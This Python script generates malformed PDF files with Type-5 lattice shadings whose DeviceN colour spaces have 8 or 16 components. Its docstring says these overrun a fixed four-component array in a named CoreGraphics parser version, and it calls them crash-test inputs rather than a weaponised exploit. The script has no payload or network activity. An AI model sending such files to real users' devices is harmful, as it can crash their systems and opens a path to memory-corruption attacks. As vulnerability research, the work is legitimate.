#!/usr/bin/env python3
"""Generate minimal PDF Type-5 lattice shadings with a DeviceN colour space.

The 27.0.1 CoreGraphics parser writes per-vertex colour components into a
fixed four-double inline array.  A DeviceN space with more than four
components overruns it.  These files are crash-test inputs for a *secondary*
device or a desktop PDF viewer, not a weaponised exploit.
"""
from pathlib import Path

OUT = Path(__file__).resolve().parent


def build_pdf(path, components=8, flags=False):
    names = " ".join(f"/C{i+1}" for i in range(components))
    domain = " ".join(["0 1"] * components)
    decode = "0 200 0 200 " + " ".join(["0 1"] * components)

    # Four vertices covering the 200x200 box.  Coordinates are 8-bit.
    verts = [(0, 0), (255, 0), (0, 255), (255, 255)]
    data = bytearray()
    for i, (x, y) in enumerate(verts):
        if flags:
            data.append(0)  # new triangle / row start
        data += bytes([x, y])
        data += bytes([(i * 3 + c) & 0xFF for c in range(components)])

    objects = []
    objects.append(b"<< /Type /Catalog /Pages 2 0 R >>")
    objects.append(b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
    objects.append(
        (
            "<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] "
            "/Resources << /Shading << /Sh1 5 0 R >> >> "
            "/Contents 4 0 R >>"
        ).encode()
    )
    content = b"q\n/Sh1 sh\nQ\n"
    objects.append(b"<< /Length %d >>\nstream\n" % len(content) + content + b"endstream")
    objects.append(
        (
            "<< /ShadingType 5 "
            f"/ColorSpace [/DeviceN [{names}] /DeviceCMYK 6 0 R] "
            "/BitsPerCoordinate 8 /BitsPerComponent 8 "
            + ("/BitsPerFlag 8 " if flags else "")
            + f"/Decode [{decode}] /VerticesPerRow 2 "
            f"/Length {len(data)} >>\nstream\n"
        ).encode()
        + bytes(data)
        + b"\nendstream"
    )
    # The tint transform is called with all `components` inputs on the stack
    # and must leave exactly four outputs (DeviceCMYK).  Pop every input, then
    # emit solid black so a successfully rendered shading is visible.
    func_body = "{ " + " ".join(["pop"] * components) + " 0 0 0 1 }"
    func = (
        f"<< /FunctionType 4 /Domain [{domain}] /Range [0 1 0 1 0 1 0 1] "
        f"/Length {len(func_body)} >>\n"
        "stream\n"
        f"{func_body}\n"
        "endstream"
    ).encode()
    objects.append(func)

    out = bytearray(b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n")
    offsets = [0]
    for i, obj in enumerate(objects, 1):
        offsets.append(len(out))
        out += f"{i} 0 obj\n".encode() + obj + b"\nendobj\n"
    xref = len(out)
    out += f"xref\n0 {len(objects)+1}\n".encode()
    out += b"0000000000 65535 f \n"
    for off in offsets[1:]:
        out += f"{off:010d} 00000 n \n".encode()
    out += (
        f"trailer\n<< /Size {len(objects)+1} /Root 1 0 R >>\nstartxref\n{xref}\n%%EOF\n"
    ).encode()
    path.write_bytes(out)
    print(f"wrote {path} ({len(out)} bytes, {components} components, flags={flags})")


if __name__ == "__main__":
    build_pdf(OUT / "type5_devicen8.pdf", components=8, flags=False)
    build_pdf(OUT / "type5_devicen8_flags.pdf", components=8, flags=True)
    build_pdf(OUT / "type5_devicen16.pdf", components=16, flags=False)
